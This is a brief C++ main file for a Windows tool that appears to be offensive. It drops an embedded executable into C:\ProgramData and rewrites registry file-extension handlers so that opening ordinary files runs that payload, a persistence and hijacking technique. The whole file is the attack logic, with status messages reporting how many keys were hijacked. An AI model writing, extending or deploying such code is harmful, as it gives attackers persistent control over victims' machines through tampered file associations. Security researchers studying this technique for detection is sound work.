#include <windows.h>
#include <stdio.h>
#include "res_dropper.h"
#include "ext_hijacker.h"

int main(int argc, char *argv[])
{
    char payloadName[] = "C:\\ProgramData\\ProxyApp.exe";
    if (!dropResource(payloadName)) {
        printf("[-] Dropping failed!\n");
    }
    std::set<std::string> handlersSet = getGlobalCommands();

    std::string classesKey = getLocalClasses();
    printf("%s\n", classesKey.c_str());
    rewriteExtensions(classesKey, handlersSet);
    
    size_t hijacked = hijackExtensions(payloadName);
    if (hijacked == 0) {
        printf("[-] Hijacking failed!\n");
    } else {
        printf("[+] Hijacked %ld keys\n", static_cast<unsigned long>(hijacked));
    }
    system("pause");
    return 0;
}

